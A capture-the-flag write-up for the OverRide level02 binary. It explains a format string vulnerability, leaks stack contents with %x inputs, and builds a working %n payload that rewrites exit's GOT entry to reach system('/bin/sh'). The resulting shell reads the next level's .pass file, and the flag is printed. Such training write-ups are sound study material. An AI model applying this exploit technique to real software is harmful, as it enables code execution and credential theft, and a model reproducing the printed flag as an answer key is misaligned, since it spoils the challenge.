# Level02

In the Level02 challenge, we encounter a binary program that requires a username and password for access. Let's examine the initial interaction:

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: test
--[ Password: root
*****************************************
test does not have access!
```

Upon further investigation using gdb, we find that the program attempts to read the contents of a file located at /home/users/level03/.pass. The retrieved password is then compared with the one we provide.

If the passwords don't match, we move to the following function:

```bash
   0x0000000000400a96 <+642>:   lea    rax,[rbp-0x70]
   0x0000000000400a9a <+646>:   mov    rdi,rax
   0x0000000000400a9d <+649>:   mov    eax,0x0
   0x0000000000400aa2 <+654>:   call   0x4006c0 <printf@plt>
   0x0000000000400aa7 <+659>:   mov    edi,0x400d3a
   0x0000000000400aac <+664>:   call   0x400680 <puts@plt>
   0x0000000000400ab1 <+669>:   mov    edi,0x1
   0x0000000000400ab6 <+674>:   call   0x400710 <exit@plt>
```

An important observation is that the program uses the printf function without proper formatting. This situation indicates the presence of a format string vulnerability, which can be exploited to leak sensitive information.

Now, let's examine how we can exploit this vulnerability:

```bash
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: AAAA
*****************************************
ffffe500 0 41 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 41414141 0 0 0 0 0  does not have access!
```

As we can see, by providing a format string as the username input, we are able to leak the contents of the stack.

Additionally, by examining the program's code, we find a section where it calls the system function, which we can exploit to execute shell commands:

```bash
   00000000400a71 <+605>:   lea    rdx,[rbp-0x70]
   0x0000000000400a75 <+609>:   mov    rsi,rdx
   0x0000000000400a78 <+612>:   mov    rdi,rax
   0x0000000000400a7b <+615>:   mov    eax,0x0
   0x0000000000400a80 <+620>:   call   0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:   mov    edi,0x400d32
   0x0000000000400a8a <+630>:   call   0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:   mov    eax,0x0
```

Let's proceed with our exploit for this binary. Our plan involves redirecting the Global Offset Table (GOT) address of the exit function to the address 0x400a71, which prepares the argument /bin/sh for the system function. By doing so, we can leverage this manipulation to execute arbitrary shell commands.

```bash
   0x0000000000400a85 <+625>:   mov    edi,0x400d32 #/bin/sh
   0x0000000000400a8a <+630>:   call   0x4006b0 <system@plt>
```

let prepare our payload:

the address of exit function in GOT is 0x601228
the instruction at ` 0x400a85 <+625>:   mov    edi,0x400d32` let convert 0x400a85 to decimal is 4196997
as we see in above example ower offset is the 8th argument

```python
python -c 'print "%4196997p"+ "%8$n"+"\n"+ "\x60\x12\x28"[::-1]'
```

```bash
level02@OverRide:~$ python -c 'print "%4196997p"+ "%8$n"+"\n"+ "\x60\x12\x28"[::-1]' >exploit
level02@OverRide:~$ (cat exploit; cat) | ./level02



           0x7fffffffe500 does not have access!
whoami
level03
```

so we can get the flag now

```bash
cd ../level03
cat .pass
Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
